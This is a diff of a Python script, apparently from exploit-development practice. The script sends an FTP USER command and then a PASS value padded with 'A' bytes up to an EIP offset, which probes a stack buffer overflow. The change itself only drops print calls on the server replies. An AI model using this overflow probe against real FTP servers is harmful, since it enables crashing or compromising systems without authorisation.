@@ -14,7 +14,7 @@ try:
 
     # usuario
     s.send(b'USER MrW0l05zyn\r\n')
-    print(s.recv(1024))
+    s.recv(1024)
 
     buf = b''
     buf += b'A'*(offsetEIP - len(buf))          # offset EIP
@@ -25,7 +25,7 @@ try:
 
     # check offset
     s.send(b'PASS ' + buf + b'\r\n')
-    print(s.recv(1024))
+    s.recv(1024)
 
 except Exception as error:
     print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
